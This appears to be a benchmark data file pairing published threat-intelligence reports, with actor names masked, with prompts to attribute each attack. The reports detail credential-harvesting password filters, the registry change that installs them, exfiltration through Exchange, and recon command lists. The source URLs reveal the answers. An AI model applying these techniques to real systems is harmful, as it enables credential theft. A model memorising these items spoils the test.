PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON (0x100000000000), as shown in Figure 9.    Figure_03_[PLACEHOLDER]_string_obfuscation  Figure 9. Unused security product evasion code in [PLACEHOLDER] backdoor  This technique’s goal is to block endpoint security solutions from loading their user-mode code hooks via a DLL in this process. While the parameter was not used in the sample we analyzed, it could be activated in future versions.    Version 1.1.1  Unrelated to the Juicy Mix campaign, in July 2023 we found a new version of the [PLACEHOLDER] backdoor (SHA-1: C9D18D01E1EC96BE952A9D7BD78F6BBB4DD2AA2A), uploaded to VirusTotal by several users under the name Menorah.exe. The internal version in this sample was changed from 1.0.0 to 1.1.1, but the only notable change is the use of a different C&C server, http://tecforsc-001-site1.gtempurl[.]com/ads.asp.    Along with this version, we also discovered a Microsoft Word document (SHA-1: 3D71D782B95F13EE69E96BCF73EE279A00EAE5DB) with a malicious macro that drops the backdoor. Figure 10 shows the fake warning message, enticing the user to enable macros for the document, and the decoy content that is displayed afterwards, while the malicious code is running in the background.    Figure_10a_malicious_macro  Figure_10b_decoy_doc  Figure 10. Microsoft Word document with a malicious macro that drops [PLACEHOLDER] v1.1.1    Post-compromise tools  In this section, we review a selection of post-compromise tools used in [PLACEHOLDER]’s Outer Space and Juicy Mix campaigns, aimed at downloading and executing additional payloads, and stealing data from the compromised systems.    SampleCheck5000 (SC5k) downloader  SampleCheck5000 (or SC5k) is a downloader used to download and execute additional [PLACEHOLDER] tools, notable for using the Microsoft Office Exchange Web Services API for C&C communication: the attackers create draft messages in this email account and hide the backdoor commands in there. Subsequently, the downloader logs into the same account, and parses the drafts to retrieve commands and payloads to execute.    SC5k uses predefined values – Microsoft Exchange URL, email address, and password – to log into the remote Exchange server, but it also supports the option to override these values using a configuration file in the current working directory named setting.key. We chose the name SampleCheck5000 based on one of the email addresses that the tool used in the Outer Space campaign.    Once SC5k logs into the remote Exchange server, it retrieves all the emails in the Drafts directory, sorts them by most recent, keeping only the drafts that have attachments. It then iterates over every draft message with an attachment, looking for JSON attachments that contain "data" in the body. It extracts the value from the key data in the JSON file, base64 decodes and decrypts the value, and calls cmd.exe to execute the resulting command line string. SC5k then saves the output of the cmd.exe execution to a local variable.    As the next step in the loop, the downloader reports the results to the [PLACEHOLDER] operators by creating a new email message on the Exchange server and saving it as a draft (not sending), as shown in Figure 11. A similar technique is used to exfiltrate files from a local staging folder. As the last step in the loop, SC5k also logs the command output in an encrypted and compressed format on disk.    Figure_03_[PLACEHOLDER]_string_obfuscation  Figure 11. Email message creation by SC5k  Browser-data dumpers  It is characteristic of [PLACEHOLDER] operators to use browser-data dumpers in their post-compromise activities. We discovered two new browser-data stealers among the post-compromise tools deployed in the Juicy Mix campaign alongside the [PLACEHOLDER] backdoor. They dump the stolen browser data in the %TEMP% directory into files named Cupdate and Eupdate (hence our names for them: CDumper and EDumper).    Both tools are C#/.NET browser-data stealers, collecting cookies, browsing history, and credentials from the Chrome (CDumper) and Edge (EDumper) browsers. We focus our analysis on CDumper, since both stealers are practically identical, save for some constants.    When executed, CDumper creates a list of users with Google Chrome installed. On execution, the stealer connects to the Chrome SQLite Cookies, History and Login Data databases under %APPDATA%\Local\Google\Chrome\User Data, and collects browser data including visited URLs and saved logins, using SQL queries.    The cookie values are then decrypted, and all collected information is added to a log file named C:\Users\<user>\AppData\Local\Temp\Cupdate, in cleartext. This functionality is implemented in CDumper functions named CookieGrab (see Figure 12), HistoryGrab, and PasswordGrab. Note that there is no exfiltration mechanism implemented in CDumper, but [PLACEHOLDER] can exfiltrate selected files via a backdoor command.    Figure_03_[PLACEHOLDER]_string_obfuscation  Figure 12. CDumper’s CookieGrab function dumps and decrypts cookies from the Chrome data store  In both Outer Space and the earlier Out to Sea campaign, [PLACEHOLDER] used a C/C++ Chrome data dumper called MKG. Like CDumper and EDumper, MKG was also able to steal usernames and passwords, browsing history, and cookies from the browser. This Chrome data dumper is typically deployed in the following file locations (with the first location being the most common):     %USERS%\public\programs\vmwaredir\<random_14_character_string>\mkc.exe  %USERS%\Public\M64.exe  Windows Credential Manager stealer  Besides browser-data dumping tools, [PLACEHOLDER] also used a Windows Credential Manager stealer in the Juicy Mix campaign. This tool steals credentials from Windows Credential Manager, and similar to CDumper and EDumper, stores them in the %TEMP% directory – this time into a file named IUpdate (hence the name IDumper). Unlike CDumper and EDumper, IDumper is implemented as a PowerShell script.    As with the browser dumper tools, it is not uncommon for [PLACEHOLDER] to collect credentials from the Windows Credential Manager. Previously, [PLACEHOLDER]’s operators were observed using VALUEVAULT, a publicly available, Go-compiled credential-theft tool (see the 2019 HardPass campaign and a 2020 campaign), for the same purpose.
https://www.trendmicro.com/en_us/research/23/b/new-apt34-malware-targets-the-middle-east.html	On December 2022, we identified a suspicious executable (detected by Trend Micro as Trojan.MSIL.REDCAP.AD) that was dropped and executed on multiple machines. Our investigation led us to link this attack to advanced persistent threat (APT) group [PLACEHOLDER], and the main goal is to steal users’ credentials. Even in case of a password reset or change, the malware is capable of sending the new credentials to the threat actors. Moreover, after analyzing the backdoor variant deployed, we found the malware capable of new exfiltration techniques — the abuse of compromised mailbox accounts to send stolen data from the internal mail boxes to external mail accounts controlled by the attackers. While not new as a technique, this is the first instance that [PLACEHOLDER] used this for their campaign deployment. Following this analysis, it is highly likely that this campaign’s routine is only a small part of a bigger chain of deployments. Users and organizations are strongly advised to reinforce their current security measures and to be vigilant of the possible vectors abused for compromise.    Routine    In this section, we describe the attack infection flow and its respective stages, as well as share details on how the group uses emails to steal and exfiltrate critical information.    First Stage: Initial Droppers    fig1-[PLACEHOLDER]-targets-the-middle-east-malware-backdoor  Figure 1. Initial stage .Net droppers  We found the initial stage .Net dropper malware called MrPerfectInstaller (detected by Trend Micro as Trojan.MSIL.REDCAP.AD) responsible for dropping four different files, with each component stored in a Base64 buffer inside the main dropper. It drops the following:     %System%\psgfilter.dll: The password filter dynamic link library (DLL) used to provide a way to implement the password policy and change notification  %ProgramData%\WindowsSoftwareDevices\DevicesSrv.exe: The main .Net responsible for exfiltrating and leaking specific files dropped into the root path of this backdoor execution. This backdoor requires the .Net library implementing Microsoft Exchange webservices to authenticate with the victim mail server and exfiltrate through it.  %ProgramData%\WindowsSoftwareDevices\Microsoft.Exchange.WebServices.dll: The library to support the second component’s capability.  %ProgramData%\WindowsSoftwareDevices\DevicesSrv.exe.config: An app configuration file for runtimes of the .Net execution environment. This allows the option of falling back to .Net 2.0.  fig2-[PLACEHOLDER]-targets-the-middle-east-malware-backdoor  Figure 2. The four Base64 encoded buffers inside the main .Net dropper  fig3-[PLACEHOLDER]-targets-the-middle-east-malware-backdoor  Figure 3. The four modules dropped by the main binary  The dropper also adds the following registry key to assist in implementing the password filter dropped earlier:    HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Lsa  Notification Packages = scecli, psgfilter    fig4-[PLACEHOLDER]-targets-the-middle-east-malware-backdoor  Figure 4. Adds the registry key  The main .Net binary implements two arguments for its operation: the first argument for installing the second stage, and the second argument for uninstalling it and unregistering the password filter dropped.    fig5-[PLACEHOLDER]-targets-the-middle-east-malware-backdoor  Figure 5. Implementing two arguments for operation  fig6-[PLACEHOLDER]-targets-the-middle-east-malware-backdoor  Figure 6. Function in case -u passed to dropper  fig7-[PLACEHOLDER]-targets-the-middle-east-malware-backdoor  Figure 7. Function in case -i passed to dropper, installing the second stage, then uninstalling it and unregistering the password filter  Second Stage:  Abusing The Dropped Password Filter Policy    Microsoft introduced Password Filters for system administrators to enforce password policies and change notifications. These filters are used to validate new passwords, confirm that these are aligned with the password policy in place, and ensure that no passwords in use can be considered compliant with the domain policy but are considered weak.    These password filters can be abused by a threat actor as a method to intercept or retrieve credentials from domain users (domain controller) or local accounts (local computer). This is because for password filters to perform, password validation requires the password of the user in plaintext from the Local Security Authority (LSA). Therefore, installing and registering an arbitrary password filter could be used to harvest credentials every time a user changes his password. This technique requires elevated access (local administrator) and can be implemented with the following steps:    Password Filter psgfilter.dll be dropped into C:\Windows\System32  Registry key modification to register the Password Filter [DLL HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Lsa  Notification Packages = scecli, psgfilter]  Using this technique, the malicious actor can capture and harvest every password from the compromised machines even after the modification. The DLL has three export functions to implement the main functionality of support for registering the DLL into the LSA, as follows:    InitializeChangeNotify: Indicates that a password filter DLL is initialized.  PasswordChangeNotify: Indicates that a password has been changed.  PasswordFilter: Validates a new password based on password policy.  fig8-[PLACEHOLDER]-targets-the-middle-east-malware-backdoor  Figure 8. First and second stages  fig9-[PLACEHOLDER]-targets-the-middle-east-malware-backdoor  Figure 9. Functions exported by DLL  When implementing the password filter export functions, the malicious actor took great care working with the plaintext passwords. When sent over networks, the plaintext passwords were first encrypted before being exfiltrated.    Data Exfiltration Through Legitimate Mail Traffic    The main backdoor function (detected by Trend Micro as Backdoor.MSIL.REDCAP.A) receives the valid domain credentials as an argument and uses it to log on to the Exchange Server and use it for data exfiltration purposes. The main function of this stage is to take the stolen password from the argument and send it to the attackers as an attachment in an email. We also observed that the threat actors relay these emails via government Exchange Servers using vaild accounts with stolen passwords.     fig10-[PLACEHOLDER]-targets-the-middle-east-malware-backdoor  Figure 10. High level overview of malware’s data exfiltration routine  First, the .Net backdoor parses a config file dropped in the main root path where it is executing from and checks for a file callled ngb inside <%ProgramData%\WindowsSoftwareDevices\DevicesTemp\> to extract three parameters:    Server: The specific Exchange mail server for the targeted government entity where the data is leaked through.  Target: The email addresses where the malicious actors receive the exfiltrated data in.  Domain: The internal active directory (AD) domain name related to the targeted government entity in the Middle East.  However, the malware also supports for the modification of old passwords to new ones, which are sent through the registered DLL password filter.     fig11-[PLACEHOLDER]-targets-the-middle-east-malware-backdoor  Figure 11. Checking the config file path ngb  The malware proceeds to initialize an ExchangeService object in the first step and supplies the stolen credentials as WebCredentials to interface with the victim mail server in the second step. Using these Exchange Web Service (EWS) bindings, the malicious actor can send mails to external recipients on behalf of any stolen user and initialize a new instance of the WebCredentials class with the username and password for the account to authenticate.    fig12-[PLACEHOLDER]-targets-the-middle-east-malware-backdoor  Figure 12. Initialize EWS binding to the victim mail server  The malware then iterates through the files found under the target path. For each file found, it adds its path to a list, which will be exfiltrated later in the last step.    fig13-[PLACEHOLDER]-targets-the-middle-east-malware-backdoor  Figure 13. Iterating through the files found under the target path  The final stage is to iterate over the collected list of file paths. For each path, it prepares an EmailMessage object with the subject “Exchange Default Message”, and a mail body content of “Exchange Server is testing services.” The iteration attaches the whole file to this EmailMessage object and sends it using the previous initalized EWS form (Steps 1 and 2 in Figure 10), which already authenticated the user account.    fig14-[PLACEHOLDER]-targets-the-middle-east-malware-backdoor  Figure 14. Exfiltrating files using mail attachments  fig15-[PLACEHOLDER]-targets-the-middle-east-malware-backdoor  Figure 15. Some hardcoded targets in the sample  fig16-[PLACEHOLDER]-targets-the-middle-east-malware-backdoor  Figure 16. How the Sent folder looks like for a compromised user  [PLACEHOLDER] Targeting and Arsenal Evolution    [PLACEHOLDER] has been documented to target organizations worldwide, particularly companies from the financial, government, energy, chemical, and telecommunications industries in the Middle East since at least 2014. Documented as a group primarily involved for cyberespionage, [PLACEHOLDER] has been previously recorded targeting government offices and show no signs of stopping with their intrusions. Our continuous monitoring of the group proves it continues to create new and updated tools to minimize the detection of their arsenal: Shifting to new data exfiltration techniques — from the heavy use of DNS-based command and control (C&C) communication to combining it with the legitimate simple mail transfer protocol (SMTP) mail traffic — to bypass any security policies enforced on the network perimeters.    From three previously documented attacks, we observed that while the group uses simple malware families, these deployments show the group's flexibility to write new malware based on researched customer environments and levels of access. This level of skill can make attribution for security researchers and reverse engineers more difficult in terms of tracking and monitoring because patterns, behaviors, and tools can be completely different for every compromise.    For instance, in the two separate attacks using Karkoff (detected by Trend Micro as Backdoor.MSIL.OILYFACE.A) in 2020 and Saitama (detected by Trend Micro as Backdoor.MSIL.AMATIAS.THEAABB) in 2022, the group used macros inside Excel files as part of the first stage to send phishing emails since the group did not have access to the enterprise yet. Contrary to this newest compromise, however, the first stage was rewritten completely in DotNet and executed by the actor directly.    Moreover, Karkoff malware has a full backdoor module using a government exchange server as a communication channel via send/received commands over an exchanged server, and used a hardcoded account to authenticate the said communication. Compared to the new malware, the latest compromise seems to be rewritten to use the same technique but only to exfiltrate data over the mail channel. Aside from using hardcoded accounts as exchange accounts, [PLACEHOLDER] can add a new module that can monitor changes in passwords and use the new accounts to send mails, exfiltrating data via Microsoft Exchange servers.    Based on a 2019 report on [PLACEHOLDER], the top countries targeted by the group are:    The United Arab Emirates  China  Jordan  Saudi Arabia  While not at the top of the group’s list, other countries in the Middle East considered as targets are Qatar, Oman, Kuwait, Bahrain, Lebanon, and Egypt.	You are given a threat report that describes a cyber incident. Any direct mentions of the threat actor group, specific campaign names, or malware names responsible have been replaced with [PLACEHOLDER]. Your task is to analyze the report and attribute the incident to a known threat actor based on the techniques, tactics, procedures (TTPs), and any other relevant information described. Please provide the name of the threat actor you believe is responsible and briefly explain your reasoning.  Threat Report: On December 2022, we identified a suspicious executable (detected by Trend Micro as Trojan.MSIL.REDCAP.AD) that was dropped and executed on multiple machines. Our investigation led us to link this attack to advanced persistent threat (APT) group [PLACEHOLDER], and the main goal is to steal users’ credentials. Even in case of a password reset or change, the malware is capable of sending the new credentials to the threat actors. Moreover, after analyzing the backdoor variant deployed, we found the malware capable of new exfiltration techniques — the abuse of compromised mailbox accounts to send stolen data from the internal mail boxes to external mail accounts controlled by the attackers. While not new as a technique, this is the first instance that [PLACEHOLDER] used this for their campaign deployment. Following this analysis, it is highly likely that this campaign’s routine is only a small part of a bigger chain of deployments. Users and organizations are strongly advised to reinforce their current security measures and to be vigilant of the possible vectors abused for compromise.    Routine    In this section, we describe the attack infection flow and its respective stages, as well as share details on how the group uses emails to steal and exfiltrate critical information.    First Stage: Initial Droppers    fig1-[PLACEHOLDER]-targets-the-middle-east-malware-backdoor  Figure 1. Initial stage .Net droppers  We found the initial stage .Net dropper malware called MrPerfectInstaller (detected by Trend Micro as Trojan.MSIL.REDCAP.AD) responsible for dropping four different files, with each component stored in a Base64 buffer inside the main dropper. It drops the following:     %System%\psgfilter.dll: The password filter dynamic link library (DLL) used to provide a way to implement the password policy and change notification  %ProgramData%\WindowsSoftwareDevices\DevicesSrv.exe: The main .Net responsible for exfiltrating and leaking specific files dropped into the root path of this backdoor execution. This backdoor requires the .Net library implementing Microsoft Exchange webservices to authenticate with the victim mail server and exfiltrate through it.  %ProgramData%\WindowsSoftwareDevices\Microsoft.Exchange.WebServices.dll: The library to support the second component’s capability.  %ProgramData%\WindowsSoftwareDevices\DevicesSrv.exe.config: An app configuration file for runtimes of the .Net execution environment. This allows the option of falling back to .Net 2.0.  fig2-[PLACEHOLDER]-targets-the-middle-east-malware-backdoor  Figure 2. The four Base64 encoded buffers inside the main .Net dropper  fig3-[PLACEHOLDER]-targets-the-middle-east-malware-backdoor  Figure 3. The four modules dropped by the main binary  The dropper also adds the following registry key to assist in implementing the password filter dropped earlier:    HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Lsa  Notification Packages = scecli, psgfilter    fig4-[PLACEHOLDER]-targets-the-middle-east-malware-backdoor  Figure 4. Adds the registry key  The main .Net binary implements two arguments for its operation: the first argument for installing the second stage, and the second argument for uninstalling it and unregistering the password filter dropped.    fig5-[PLACEHOLDER]-targets-the-middle-east-malware-backdoor  Figure 5. Implementing two arguments for operation  fig6-[PLACEHOLDER]-targets-the-middle-east-malware-backdoor  Figure 6. Function in case -u passed to dropper  fig7-[PLACEHOLDER]-targets-the-middle-east-malware-backdoor  Figure 7. Function in case -i passed to dropper, installing the second stage, then uninstalling it and unregistering the password filter  Second Stage:  Abusing The Dropped Password Filter Policy    Microsoft introduced Password Filters for system administrators to enforce password policies and change notifications. These filters are used to validate new passwords, confirm that these are aligned with the password policy in place, and ensure that no passwords in use can be considered compliant with the domain policy but are considered weak.    These password filters can be abused by a threat actor as a method to intercept or retrieve credentials from domain users (domain controller) or local accounts (local computer). This is because for password filters to perform, password validation requires the password of the user in plaintext from the Local Security Authority (LSA). Therefore, installing and registering an arbitrary password filter could be used to harvest credentials every time a user changes his password. This technique requires elevated access (local administrator) and can be implemented with the following steps:    Password Filter psgfilter.dll be dropped into C:\Windows\System32  Registry key modification to register the Password Filter [DLL HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Lsa  Notification Packages = scecli, psgfilter]  Using this technique, the malicious actor can capture and harvest every password from the compromised machines even after the modification. The DLL has three export functions to implement the main functionality of support for registering the DLL into the LSA, as follows:    InitializeChangeNotify: Indicates that a password filter DLL is initialized.  PasswordChangeNotify: Indicates that a password has been changed.  PasswordFilter: Validates a new password based on password policy.  fig8-[PLACEHOLDER]-targets-the-middle-east-malware-backdoor  Figure 8. First and second stages  fig9-[PLACEHOLDER]-targets-the-middle-east-malware-backdoor  Figure 9. Functions exported by DLL  When implementing the password filter export functions, the malicious actor took great care working with the plaintext passwords. When sent over networks, the plaintext passwords were first encrypted before being exfiltrated.    Data Exfiltration Through Legitimate Mail Traffic    The main backdoor function (detected by Trend Micro as Backdoor.MSIL.REDCAP.A) receives the valid domain credentials as an argument and uses it to log on to the Exchange Server and use it for data exfiltration purposes. The main function of this stage is to take the stolen password from the argument and send it to the attackers as an attachment in an email. We also observed that the threat actors relay these emails via government Exchange Servers using vaild accounts with stolen passwords.     fig10-[PLACEHOLDER]-targets-the-middle-east-malware-backdoor  Figure 10. High level overview of malware’s data exfiltration routine  First, the .Net backdoor parses a config file dropped in the main root path where it is executing from and checks for a file callled ngb inside <%ProgramData%\WindowsSoftwareDevices\DevicesTemp\> to extract three parameters:    Server: The specific Exchange mail server for the targeted government entity where the data is leaked through.  Target: The email addresses where the malicious actors receive the exfiltrated data in.  Domain: The internal active directory (AD) domain name related to the targeted government entity in the Middle East.  However, the malware also supports for the modification of old passwords to new ones, which are sent through the registered DLL password filter.     fig11-[PLACEHOLDER]-targets-the-middle-east-malware-backdoor  Figure 11. Checking the config file path ngb  The malware proceeds to initialize an ExchangeService object in the first step and supplies the stolen credentials as WebCredentials to interface with the victim mail server in the second step. Using these Exchange Web Service (EWS) bindings, the malicious actor can send mails to external recipients on behalf of any stolen user and initialize a new instance of the WebCredentials class with the username and password for the account to authenticate.    fig12-[PLACEHOLDER]-targets-the-middle-east-malware-backdoor  Figure 12. Initialize EWS binding to the victim mail server  The malware then iterates through the files found under the target path. For each file found, it adds its path to a list, which will be exfiltrated later in the last step.    fig13-[PLACEHOLDER]-targets-the-middle-east-malware-backdoor  Figure 13. Iterating through the files found under the target path  The final stage is to iterate over the collected list of file paths. For each path, it prepares an EmailMessage object with the subject “Exchange Default Message”, and a mail body content of “Exchange Server is testing services.” The iteration attaches the whole file to this EmailMessage object and sends it using the previous initalized EWS form (Steps 1 and 2 in Figure 10), which already authenticated the user account.    fig14-[PLACEHOLDER]-targets-the-middle-east-malware-backdoor  Figure 14. Exfiltrating files using mail attachments  fig15-[PLACEHOLDER]-targets-the-middle-east-malware-backdoor  Figure 15. Some hardcoded targets in the sample  fig16-[PLACEHOLDER]-targets-the-middle-east-malware-backdoor  Figure 16. How the Sent folder looks like for a compromised user  [PLACEHOLDER] Targeting and Arsenal Evolution    [PLACEHOLDER] has been documented to target organizations worldwide, particularly companies from the financial, government, energy, chemical, and telecommunications industries in the Middle East since at least 2014. Documented as a group primarily involved for cyberespionage, [PLACEHOLDER] has been previously recorded targeting government offices and show no signs of stopping with their intrusions. Our continuous monitoring of the group proves it continues to create new and updated tools to minimize the detection of their arsenal: Shifting to new data exfiltration techniques — from the heavy use of DNS-based command and control (C&C) communication to combining it with the legitimate simple mail transfer protocol (SMTP) mail traffic — to bypass any security policies enforced on the network perimeters.    From three previously documented attacks, we observed that while the group uses simple malware families, these deployments show the group's flexibility to write new malware based on researched customer environments and levels of access. This level of skill can make attribution for security researchers and reverse engineers more difficult in terms of tracking and monitoring because patterns, behaviors, and tools can be completely different for every compromise.    For instance, in the two separate attacks using Karkoff (detected by Trend Micro as Backdoor.MSIL.OILYFACE.A) in 2020 and Saitama (detected by Trend Micro as Backdoor.MSIL.AMATIAS.THEAABB) in 2022, the group used macros inside Excel files as part of the first stage to send phishing emails since the group did not have access to the enterprise yet. Contrary to this newest compromise, however, the first stage was rewritten completely in DotNet and executed by the actor directly.    Moreover, Karkoff malware has a full backdoor module using a government exchange server as a communication channel via send/received commands over an exchanged server, and used a hardcoded account to authenticate the said communication. Compared to the new malware, the latest compromise seems to be rewritten to use the same technique but only to exfiltrate data over the mail channel. Aside from using hardcoded accounts as exchange accounts, [PLACEHOLDER] can add a new module that can monitor changes in passwords and use the new accounts to send mails, exfiltrating data via Microsoft Exchange servers.    Based on a 2019 report on [PLACEHOLDER], the top countries targeted by the group are:    The United Arab Emirates  China  Jordan  Saudi Arabia  While not at the top of the group’s list, other countries in the Middle East considered as targets are Qatar, Oman, Kuwait, Bahrain, Lebanon, and Egypt.
https://www.trendmicro.com/en_us/research/24/d/earth-freybug.html	In the past month, we investigated a cyberespionage attack that we have attributed to [PLACEHOLDER]. [PLACEHOLDER] is a cyberthreat group that has been active since at least 2012 that focuses on espionage and financially motivated activities. It has been observed to target organizations from various sectors across different countries. [PLACEHOLDER] actors use a diverse range of tools and techniques, including LOLBins and custom malware. This article provides an in-depth look into two techniques used by [PLACEHOLDER] actors: dynamic-link library (DLL) hijacking and application programming interface (API) unhooking to prevent child processes from being monitored via a new malware we’ve discovered and dubbed UNAPIMON.  Background of the attack flow The tactics, techniques, and procedures (TTPs) used in this campaign are similar to the ones from a campaign described in an article published by Cybereason. In this incident, we observed a vmtoolsd.exe process that creates a remote scheduled task using schtasks.exe. Once executed, this launches a pre-deployed cc.bat in the remote machine.  [PLACEHOLDER] attack chain Figure 1. [PLACEHOLDER] attack chain download vmtoolsd.exe is a component of VMware Tools called VMware user process, which is installed and run inside a guest virtual machine to facilitate communication with the host machine. Meanwhile, schtasks.exe is a component of Windows called Task Scheduler Configuration Tool, which is used to manage tasks in a local or remote machine. Based on the behavior we observed from our telemetry, a code of unknown origin was injected in vmtoolsd.exe that started schtasks.exe. It’s important to note that both vmtoolsd.exe and schtasks.exe are legitimate files. Although the origin of the malicious code in vmtoolsd.exe in this incident is unknown, there have been documented infections wherein vulnerabilities in legitimate applications were exploited via vulnerable external-facing servers.  Command line for executing the Task Scheduler Configuration Tool. Figure 2. Command line for executing the Task Scheduler Configuration Tool. download First cc.bat for reconnaissance  Once the scheduled task is triggered, a previously deployed batch file, %System%\cc.bat, is executed in the remote machine. Based on our telemetry, this batch file launches commands to gather system information. Among the commands executed are:  powershell.exe  -command "Get-NetAdapter |select InterfaceGuid" arp  -a ipconfig  /all fsutil  fsinfo drives query  user net  localgroup administrators systeminfo whoami netstat  -anb -p tcp net  start tasklist  /v net  session net  share net  accounts net  use net  user net  view net  view /domain net  time \\127.0.0.1 net  localgroup administrators /domain wmic  nic get "guid" The system information gathered via these commands is gathered in a text file called %System%\res.txt.  Once this is done, another scheduled task is set up to execute %Windows%\Installer\cc.bat in the target machine, which launches a backdoor.  Second cc.bat hijacking for DLL side-loading  The second cc.bat is notable for leveraging a service that loads a nonexistent library to side-load a malicious DLL. In this case, the service is SessionEnv. A detailed technical description of how this technique works can be found here. In this technique, this second cc.bat first copies a previously dropped %Windows%\Installer\hdr.bin to %System%\TSMSISrv.DLL. It then stops the SessionEnv service, waits for a few seconds, then restarts the service. This will make the service load and execute the file %System%\TSMSISrv.DLL.  Two actions of interest done by TSMSISrv.DLL are dropping and loading a file named Windows%\_{5 to 9 random alphabetic characters}.dll and starting a cmd.exe process in which the same dropped DLL is also injected. Based on telemetry data, we noticed that this instance of cmd.exe is used to execute commands coming from another machine, thus turning it into a backdoor. We dubbed the dropped DLL loaded in both the service and cmd.exe as UNAPIMON.  Introducing UNAPIMON for defense evasion  An interesting thing that we observed in this attack is the use of a peculiar malware that we named UNAPIMON. In its essence, UNAPIMON employs defense evasion techniques to prevent child processes from being monitored, which we detail in the succeeding sections.  Malware analysis  UNAPIMON itself is straightforward: It is a DLL malware written in C++ and is neither packed nor obfuscated; it is not encrypted save for a single string.  At the DllMain function, it first checks whether it is being loaded or unloaded. When the DLL is being loaded, it creates an event object for synchronization, and starts the hooking thread.  As shown in Figure 3, the hooking thread first obtains the address of the function CreateProcessW from kernel32.dll, which it saves for later use. CreateProcessW is one of the Windows API functions that can be used to create a process. It then installs a hook on it using Microsoft Detours, an open-source software package developed by Microsoft for monitoring and instrumenting API calls on Windows.  Hooking thread disassembly Figure 3. Hooking thread disassembly download This mechanism redirects any calls made to CreateProcessW from a process where this DLL is loaded to the hook.  The hook function calls the original CreateProcessW using the previously saved address to create the actual process but with the value CREATE_SUSPENDED (4) in the creation flags parameter. This effectively creates the process, but whose main thread is suspended.  Fig4-Earth%20Freybug Figure 4. Calling “CreateProcessW” with “CREATE_SUSPENDED” download It then walks through a list of hardcoded DLL names as shown in Figure 5.  List of DLL names Figure 5. List of DLL names download For each DLL in the list that is loaded in the child process, it creates a copy of the DLL file to %User Temp%\_{5 to 9 random alphabetic characters}.dll (hereafter to be referred to as the local copy), which it then loads using the API function LoadLibraryEx with the parameter DONT_RESOLVE_DLL_REFERENCES (1). It does this to prevent a loading error as described in this article.  Copy and load DLL Figure 6. Copy and load DLL download After the local copy of the DLL has been loaded, it then proceeds to create a local memory copy of the loaded DLL image with the same name in the child process. To ensure that the two DLLs are the same, it compares both the values of the checksum field in the headers and the values of the number of name pointers in the export table.  Once verified to be identical, it walks through all exported addresses in the export table. For each exported address, it checks to ensure that the address points to a code in an executable memory page, and that the starting code has been modified. Specifically, it checks if the memory page protection has the values PAGE_EXECUTE (0x10), PAGE_EXECUTE_READ (0x20), or PAGE_EXECUTE_READWRITE (0x40). Modifications are detected if the first byte in the exported address is either 0xE8 (CALL), 0xE9 (JMP), or if its first two bytes are not equal to the corresponding first two bytes in the loaded local copy. Additionally, it also verifies that the name of the exported address is not RtlNtdllName, which contains data instead of executable code.  Exported address checking Figure 7. Exported address checking download If an exported address passes these tests, it is added to a list for unpatching.  Once all the DLL names in the list have been processed, it walks through each of the addresses in the unpatching list. For each address, it copies 8 bytes from the loaded local copy (the original) to the remote address, which has been previously modified. This effectively removes any code patches applied to an exported address.  Unpatching loop Figure 8. Unpatching loop download Finally, it unloads and deletes the randomly named local copy of the DLL and resumes the main thread. When the malware is unloaded, it removes the hook from CreateProcessW.  Impact  Looking at the behavior of UNAPIMON and how it was used in the attack, we can infer that its primary purpose is to unhook critical API functions in any child process. For environments that implement API monitoring through hooking such as sandboxing systems, UNAPIMON will prevent child processes from being monitored. Thus, this malware can allow any malicious child process to be executed with its behavior undetected.  A unique and notable feature of this malware is its simplicity and originality. Its use of existing technologies, such as Microsoft Detours, shows that any simple and off-the-shelf library can be used maliciously if used creatively. This also displayed the coding prowess and creativity of the malware writer. In typical scenarios, it is the malware that does the hooking. However, it is the opposite in this case.  Security recommendations In this specific [PLACEHOLDER] attack, the threat actor used administrator accounts, which means that the threat actors knew the admin credentials, rendering group policies useless. The only way to prevent this from happening in an environment is good housekeeping, which involves frequent password rotation, limiting access to admin accounts to actual admins, and activity logging.  In this incident, data exfiltration was done using a third-party collaborative software platform over which we do not have control. Even if the write permissions were revoked for affected folders that could be accessed through the collaborative software, the threat actor could just simply override it, since the threat actor is the admin from the system’s point of view.  Users should restrict admin privileges and follow the principle of least privilege. The fewer people with admin privileges, the fewer loopholes in the system malicious actors can take advantage of.  Conclusion  [PLACEHOLDER] has been around for quite some time, and their methods have been seen to evolve through time. This was evident from what we observed from this attack: We concluded that they are still actively finding ways to improve their techniques to successfully achieve their goals.  This attack also demonstrates that even simple techniques can be used effectively when applied correctly. Implementing these techniques to an existing attack pattern makes the attack more difficult to discover. Security researchers and SOCs must keep a watchful eye not only on malicious actors’ advanced techniques, but also the simple ones that are easily overlooked.	You are given a threat report that describes a cyber incident. Any direct mentions of the threat actor group, specific campaign names, or malware names responsible have been replaced with [PLACEHOLDER]. Your task is to analyze the report and attribute the incident to a known threat actor based on the techniques, tactics, procedures (TTPs), and any other relevant information described. Please provide the name of the threat actor you believe is responsible and briefly explain your reasoning.  Threat Report: In the past month, we investigated a cyberespionage attack that we have attributed to [PLACEHOLDER]. [PLACEHOLDER] is a cyberthreat group that has been active since at least 2012 that focuses on espionage and financially motivated activities. It has been observed to target organizations from various sectors across different countries. [PLACEHOLDER] actors use a diverse range of tools and techniques, including LOLBins and custom malware. This article provides an in-depth look into two techniques used by [PLACEHOLDER] actors: dynamic-link library (DLL) hijacking and application programming interface (API) unhooking to prevent child processes from being monitored via a new malware we’ve discovered and dubbed UNAPIMON.  Background of the attack flow The tactics, techniques, and procedures (TTPs) used in this campaign are similar to the ones from a campaign described in an article published by Cybereason. In this incident, we observed a vmtoolsd.exe process that creates a remote scheduled task using schtasks.exe. Once executed, this launches a pre-deployed cc.bat in the remote machine.  [PLACEHOLDER] attack chain Figure 1. [PLACEHOLDER] attack chain download vmtoolsd.exe is a component of VMware Tools called VMware user process, which is installed and run inside a guest virtual machine to facilitate communication with the host machine. Meanwhile, schtasks.exe is a component of Windows called Task Scheduler Configuration Tool, which is used to manage tasks in a local or remote machine. Based on the behavior we observed from our telemetry, a code of unknown origin was injected in vmtoolsd.exe that started schtasks.exe. It’s important to note that both vmtoolsd.exe and schtasks.exe are legitimate files. Although the origin of the malicious code in vmtoolsd.exe in this incident is unknown, there have been documented infections wherein vulnerabilities in legitimate applications were exploited via vulnerable external-facing servers.  Command line for executing the Task Scheduler Configuration Tool. Figure 2. Command line for executing the Task Scheduler Configuration Tool. download First cc.bat for reconnaissance  Once the scheduled task is triggered, a previously deployed batch file, %System%\cc.bat, is executed in the 